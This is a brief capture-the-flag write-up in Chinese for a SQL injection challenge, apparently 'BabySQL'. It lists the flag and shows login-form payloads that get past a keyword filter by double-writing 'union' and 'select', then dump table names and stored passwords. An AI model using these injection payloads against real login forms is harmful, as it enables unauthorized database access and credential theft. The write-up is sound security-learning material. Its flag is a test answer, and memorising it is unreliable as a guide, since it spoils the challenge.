---
Author: SuperJason
Date: 2020-12-30
---

## flag
`flag{518a6b39-0416-4b19-85d5-477975f31b6e}`

## 思路
1. 访问环境，`username=admin' or 1=1 -- -&password=1`万能密码失效，根据报错提示or被过滤了。多次测试后，通过双写绕过关键字过滤，`username=admin' ununionion seselectlect 1,2,3 -- -&password=1`。  
2. 题目现在开始基本与LoveSQL类似了，开始爆数据库、数据表、字段。 
   - geek
   - b4bsql,geekuser 
   - `username=-1' ununionion seselectlect 1,group_concat(passwoorrd),3 frofromm b4bsql -- -&password=1`
   - b4bsql表字段：id,username,password
   ![](./images/babysql-1.png)

